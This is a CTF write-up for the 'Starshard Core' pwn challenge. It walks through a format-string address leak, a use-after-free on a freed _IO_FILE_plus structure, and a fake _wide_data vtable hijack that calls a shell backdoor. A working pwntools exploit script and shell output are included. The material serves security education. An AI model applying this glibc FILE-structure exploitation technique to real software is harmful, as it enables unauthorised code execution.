# htb-university-2025_Starshard Core

![](../../assets/banner.png)

<img src="../../assets/htb.png" style="margin-left: 20px; zoom: 80%;" align="left" />        <font size="10">Starshard Core</font>

​        19<sup>th</sup> December 2025

​        Prepared By: 131LL

​        Challenge Author(s): 131LL

​        Difficulty: <font color=green>Medium</font>


# Synopsis

Starshard Core is medium pwn challenge, where the player has to obtain address leaks, and leverage a Use-After-Free vulnerability to overwrite a `_IO_FILE_plus` structure of an open file, and eventually spawn a shell.

## Skills Required

- Leaking addresses with format string attacks
- Familiarity with basic heap concepts

## Skills Learned

- Exploiting _IO_FILE_plus structures
- Crafting fake _wide_data struct entries

# Description

```
In the snow-glittered workshops of Tinselwick, a curious “Starshard Console” is used to arm tiny routines and stitch wish-scripts into the Great Snowglobe’s heart. Each tinkerer signs in, names their ritual, and feeds a fragment of magic to be etched into the Starshard Core’s log.

But rumors say the console was built with a mischievous shortcut—one that lets the Gingerbit Gremlin slip through the cracks if you greet it just the wrong way. Your job is to find that crack, and coax the console into opening a door it was never meant to show.
```

# Enumeration

### Protections

Let's start by running `file` and `checksec` against the binary we are given:

```bash
$ file starshard_core
starshard_core: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter glibc/ld-2.34.so, for GNU/Linux 3.2.0, BuildID[sha1]=bdf30acf784bc14c236f0f384162aa3348c6c049, with debug_info, not stripped

$ checksec --file=starshard_core
  Arch:     amd64-64-little
  RELRO:    Full RELRO
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
  RUNPATH:  b'./glibc'
```

We do not really find anything interesting here.

### Program Interface

Let's run the binary and see what we get:

```
$ ./starshard_core 
          ____
       .-" +' "-.
      /.'.'A_'*`.\
     |:.*'/\\-\.':|
     |:.'.||"|.'*:|
      \:~^~^~^~^:/
       /`-....-'\
      /          \
      `-.,____,.-'

Tinselwick Tinkerer Name: 131LL
=== Welcome 131LL — Starshard Console ===

[1] Arm Starshard Routine
[2] Attach Wish-Script Fragment
[3] Cancel Routine
[4] Commit Routine
[5] Quit
>
```

First, we are prompted to enter our name, and then we are greeted with a menu of 5 options.

### Disassembly ⛏️

Taking a closer look with `Ghidra`, and look for potential bugs in the code.

`main`:

```C
setup();
banner();
printf("Tinselwick Tinkerer Name: ");
pcVar2 = fgets(console_state.tinkerer_name,0x10,stdin);
if (pcVar2 == (char *)0x0) {
  puts("[!] Input error.");
  return 1;
}
sVar3 = strcspn(console_state.tinkerer_name,"\n");
console_state.tinkerer_name[sVar3] = '\0';
printf("=== Welcome ");
printf(console_state.tinkerer_name);
puts(&DAT_00102317);
```

Straight from the start, we can see a format string vulnerability here, since `printf` is not being used with a format specifier. This means we can leak addresses, and calculate the `PIE` base as well as `libc`. We cannot however obtain a heap leak through this, because at this point the heap is not even initialized yet.

`arm_routine`:

```C
void arm_routine(void)
{
  int iVar1;
  int ch;
  size_t i;
  
  console_state.core_log = (FILE *)fopen("starshard_core.txt","a");
  if ((FILE *)console_state.core_log == (FILE *)0x0) {
    perror("fopen");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  setvbuf((FILE *)console_state.core_log,(char *)0x0,2,0);
  printf("Enter Starshard Routine Name: ");
  i = 0;
  while (i < 0x18) {
    iVar1 = fgetc(stdin);
    if ((iVar1 == -1) || (iVar1 == 10)) break;
    console_state.spell_name[i] = (char)iVar1;
    i = i + 1;
  }
  printf(&DAT_001020ef,0x104070);
  return;
}
```

This is the function called when we select the first option on the menu. It first opens a file using `fopen`, "starshard_core.txt". After that, it prompts the user for a "starshard routine name", copies the given name to a global struct field, `console_state.spell_name`.

We can also see this struct used to keep track of the `FILE` pointer of the opened file, as well as the tinkerer name in `main`.

`feed_fragment`:

```C
void feed_fragment(void)
{
  long lVar1;
  char *pcVar2;
  long in_FS_OFFSET;
  char size_str [16];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  if (console_state.core_log == (FILE *)0x0) {
    puts("[!] No active Starshard routine.");
  }
  else {
    console_state.spell_fragment = (char *)0x0;
    console_state.fragment_sz = 0;
    printf("Wish-Script Fragment Size: ");
    size_str[0] = '\0';
    size_str[1] = '\0';
    size_str[2] = '\0';
    size_str[3] = '\0';
    size_str[4] = '\0';
    size_str[5] = '\0';
    size_str[6] = '\0';
    size_str[7] = '\0';
    size_str[8] = '\0';
    size_str[9] = '\0';
    size_str[10] = '\0';
    size_str[0xb] = '\0';
    size_str[0xc] = '\0';
    size_str[0xd] = '\0';
    size_str[0xe] = '\0';
    size_str[0xf] = '\0';
    pcVar2 = fgets(size_str,0x10,stdin);
    if (pcVar2 == (char *)0x0) {
      puts("[!] Invalid input.");
    }
    else {
      console_state.fragment_sz = strtoull(size_str,(char **)0x0,10);
      if (console_state.fragment_sz < 0x1f5) {
        console_state.spell_fragment = (char *)malloc(console_state.fragment_sz);
        if (console_state.spell_fragment == (char *)0x0) {
          perror("malloc");
                    /* WARNING: Subroutine does not return */
          exit(1);
        }
        puts("Input Wish-Script Fragment:");
        pcVar2 = fgets(console_state.spell_fragment,(int)console_state.fragment_sz + -1,stdin);
        if (pcVar2 == (char *)0x0) {
          puts("[!] Fragment input error.");
        }
        else {
          puts("[*] Fragment Stored.");
        }
      }
      else {
        puts("[!] Fragment exceeds safe sparkle limit.");
      }
    }
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

When calling this function, it first checks if `console_state.core_log` is `NULL`, in which case it imediately returns. Then, it asks the user for the size of the fragment they will input, and if the size does not exceed a hardcoded upper limit, it uses `malloc` to allocate space for it in the heap, and stores the pointer in `console_state.spell_fragment`. The player is then prompted to input data into that heap chunk.

`cancel_routine`:

```C
void cancel_routine(void)
{
  if (console_state.core_log == (FILE *)0x0) {
    puts("[!] No active routine.");
  }
  else {
    fclose((FILE *)console_state.core_log);
    puts("[*] Routine Cancelled.");
  }
  return;
}
```

The `cancel_routine` function basically closes the log file opened in `arm_routine`. This contains a crucial bug though; it uses fclose, but it does not `NULL` out the pointer `console_state.core_log`, so other functions keep using it like normal.

`commit_routine`:

```C
void commit_routine(void)
{
  if (console_state.core_log == (FILE *)0x0) {
    puts("[!] No active routine.");
  }
  else {
    fputs(console_state.spell_fragment,(FILE *)console_state.core_log);
    puts("[*] Routine Committed to Starshard Core.");
  }
  return;
}
```

`commit_routine` is the last function we will be covering, and it basically copies over the `spell_fragment` we provided into the file itself.

### Exploitation

We have a few findings by reading the code that helps us get started.

When `fopen` is called, an `_IO_FILE_plus` structure is allocated on the heap. Naturally, when `fclose` is called, that structure is freed. Let's take a look at how this structure looks after we have opened the `starshard_core.txt` file:

```
$1 = {
  file = {
    _flags = -72534905,
    _IO_read_ptr = 0x55555555c323 "",
    _IO_read_end = 0x55555555c323 "",
    _IO_read_base = 0x55555555c323 "",
    _IO_write_base = 0x55555555c323 "",
    _IO_write_ptr = 0x55555555c323 "",
    _IO_write_end = 0x55555555c323 "",
    _IO_buf_base = 0x55555555c323 "",
    _IO_buf_end = 0x55555555c324 "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7ffff7e19680 <_IO_2_1_stderr_>,
    _fileno = 3,
    _flags2 = 0,
    _old_offset = 0,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x55555555c380,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x55555555c390,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7ffff7e1a560 <__GI__IO_file_jumps>
}
```

Leveraging the bug found in `cancel_routine`, we can:

1. Use `arm_routine` to get the program to allocate the `_IO_FILE_plus` structure
2. Use `cancel_routine` to free that structure but keep the pointer
3. Use `feed_fragment`, requesting a chunk of equal size to an `_IO_FILE_plus` structure, and getting a chunk on top of the freed structure.

This way we can perform some FILE structure exploitation and call the `ginger_gate` function, which is a `/bin/sh` backdoor inside the binary.

Let's first work on getting a `PIE`, `libc` and `heap` leak. As we discussed, the first two can be obtained through the format string vulnerability spotted in `main`.

```python
# helper functions:
def arm(name=b"0xdeadbeef"):
  r.sendline(b"1")
  r.sendlineafter(b"Name: ", name)
  return r.recv(1024)

def attach(size, fragment):
  r.sendline(b"2")
  r.sendlineafter(b"Size: ", str(size).encode())
  r.sendlineafter(b"Fragment:\n", fragment)

r.sendlineafter(b"Name: ", b"%10$p.%29$p")
r.recvuntil(b"Welcome ")
leaks = [int(s, 0x10) for s in  r.recvuntil(b" ").decode().split(".")]
print([hex(x) for x in leaks])
elf.address = leaks[0] - 0x40
libc.address = leaks[1] - 0x2e07d
print(f"libc @ {hex(libc.address)}")
print(f"elf  @ {hex(elf.address)}")
assert libc.address & 0xfff == 0, "libc leak failed"
assert elf.address & 0xfff == 0, "PIE leak failed"
```

In the `console_state` structure, the `spell_name` field is 24 bytes long, and the `FILE` pointer holding the open `starshard_core.txt` sits right after it in memory. If we provide 24 bytes of data to the `spell_name`, when it tries to print it back out, the `FILE` pointer will be concatenated to it, since there will be no `NULL` terminator between the two.

```python
heap_base = u64(arm(name=b"A" * 24).split(b"A"*24)[1][:6].ljust(8, b"\x00")) - 0x2a0
print(f"heap @ {hex(heap_base)}")
assert heap_base & 0xfff == 0, "heap leak failed"
```

Having a heap leak, we can calculate the address of the `_IO_FILE_plus` structure on the heap:

```python
fp_addr = heap_base + 0x2a0
```

Now, let's say we can get a heap chunk over a freed `_IO_FILE_plus` structure. What would we overwrite?

The `vtable` has security checks, so we cannot use it to call the win function straight away. It can only point to a valid vtable memory region.

`_wide_data` is a field pointing to a `_IO_wide_data` structure that contains all the state information needed for wide character (`wchar_t`) I/O operations on a FILE stream.

Interestingly, the `_IO_wide_data` structure `vtable` does not contain such checks, and can be exploited.

```C
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr; 
  wchar_t *_IO_read_end; 
  wchar_t *_IO_read_base;
  wchar_t *_IO_write_base;
  wchar_t *_IO_write_ptr;
  wchar_t *_IO_write_end;
  wchar_t *_IO_buf_base; 
  wchar_t *_IO_buf_end;  
  
  // ... more state fields ...
  
  struct _IO_codecvt *_codecvt;
  
  const struct _IO_jump_t *_wide_vtable;  // Wide char vtable!
};
```

But how can we make use of the `_IO_wide_data` vtable, if in our case, it is not being used ?

Let's take a look into what happens when we call `fwrite` (through `fprintf`) in `commit_routine`:

```C
disass __GI__IO_fwrite
Dump of assembler code for function __GI__IO_fwrite:
Address range 0x7ffff7c83fa0 to 0x7ffff7c84126:
   0x00007ffff7c83fa0 <+0>:     endbr64
   ... ... ...
   0x00007ffff7c84050 <+176>:   mov    rdi,rbx
   0x00007ffff7c84053 <+179>:   call   QWORD PTR [r15+0x38]
```

The function in the `vtable` list `+ 0x38` gets called. We could shift the `vtable` pointer, while keeping it valid, but `pointer + 0x38` would point to different vtable functions.

There are valid functions that trigger the use of the `_IO_wide_data`.

`__GI__IO_wfile_overflow` is an internal glibc function that's part of the wide character file I/O implementation. It's a `vtable` function pointer in the `_IO_wide_data` structure associated with wide-oriented FILE streams.

We can look for this function in the vtable memory region, subtract the offset of `0x38`, and place that value on the vtable pointer. This way, calling `fwrite` will trigger `__GI__IO_wfile_overflow`.

```C
pwndbg> x/100a 0x7ffff7e1a560-0x600
0x7ffff7e19f60 <_IO_wfile_jumps_mmap>:  0x0     0x0
0x7ffff7e19f70 <_IO_wfile_jumps_mmap+16>:       0x7ffff7c8ff70 <_IO_new_file_finish>    0x7ffff7c8a360 <__GI__IO_wfile_overflow> <------ !
0x7ffff7e19f80 <_IO_wfile_jumps_mmap+32>:       0x7ffff7c8a000 <_IO_wfile_underflow_mmap>       0x7ffff7c87880 <__GI__IO_wdefault_uflow>
0x7ffff7e19f90 <_IO_wfile_jumps_mmap+48>:       0x7ffff7c87640 <__GI__IO_wdefault_pbackfail>    0x7ffff7c8a810 <__GI__IO_wfile_xsputn>
... ... ...
```

So, overwriting the vtable should result in something like this:

```C
p *(struct _IO_FILE_plus *)0x592a5af392a0
$1 = {
  file = {
    _flags = 0,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x592a5af39380, // can be calculated with libc leak to have original value
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x592a5af394a0, // will show fake wide data struct later
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x74a37141a000 <_IO_wfile_jumps_mmap+160>
}
pwndbg> x/a 0x74a37141a000 + 0x38 // overwritten vtable pointer + offset
0x74a37141a038 <__GI__IO_wfile_jumps+24>:       0x74a37128a360 <__GI__IO_wfile_overflow>
```

`__GI__IO_wfile_overflow` calls `__GI__IO_wdoallocbuf`, which uses the `_IO_wide_data` vtable.

```C
disass __GI__IO_wdoallocbuf 
Dump of assembler code for function __GI__IO_wdoallocbuf:
   0x000074a371287bb0 <+0>:     endbr64 
   ... ... ...
   0x000074a371287bd2 <+34>:    jne    0x74a371287c48 <__GI__IO_wdoallocbuf+152>
   0x000074a371287bd4 <+36>:    mov    rax,QWORD PTR [rax+0xe0]
   0x000074a371287bdb <+43>:    call   QWORD PTR [rax+0x68] <-----
   0x000074a371287bde <+46>:    cmp    eax,0xffffffff
   ... ... ...
```

The function at offset `0x68` is being utilized.

Let's have a quick recap before we dive into the exploit code:

```
1. Format string + string concatenation leak -> we have addresses for PIE, libc, heap
2. UAF allows us to overwrite the freed _IO_FILE_plus structure, which is still being used after being freed
3. Overwrite its vtable pointer, so __GI__IO_wfile_overflow gets trigger when fwrite is called
4. Create a fake _IO_wide_data structure on the heap, and place a pointer to it in the _IO_FILE_plus structure's _wide_data field
5. Have the _IO_wide_data's vtable point to an arbitrary location with no security checks, so the ginger_gate function gets called
```

```python
# padding to not consolidate freed FILE struct with top chunk
attach(0x10, b"AAAA")

# overlapping _IO_wide_data structure + vtable,
# two allocations are not necessary since we only care for
# one offset to be valid and working(+0x68)
wide_data_struct = b"\x00" * 0x68
wide_data_struct += p64(elf.sym.ginger_gate)
wide_data_struct += b"\x00" * (0xe0 - len(wide_data_struct))
wide_data_struct += p64(fp_addr + 0x200) # overlapping

attach(0x100, wide_data_struct)

# free FILE struct
cancel()

# overwrite free FILE structure
fp = FileStructure()
fp._lock = fp_addr + 0xe0
fp._wide_data = fp_addr + 0x200
fp.vtable = libc.address + 0x21a000
fp = bytes(fp) + p64(0)
attach(472, fp)
r.interactive()

print("Triggering fwrite...")
commit()

r.interactive()
```

### Solution

Having successfully exploited the `_IO_FILE_plus` structure, we can pop a shell.

```bash
$ ./solver.py 

libc @ 0x7362952e5000
elf  @ 0x5667b0622000
heap @ 0x5667cfc40000
Triggering fwrite...
[*] Switching to interactive mode
[*] Fragment Stored.

[1] Arm Starshard Routine
[2] Attach Wish-Script Fragment
[3] Cancel Routine
[4] Commit Routine
[5] Quit
> $ ls
flag.txt
glibc
starshard_core
starshard_core.txt
$ cat flag.txt
HTB{***********************}
```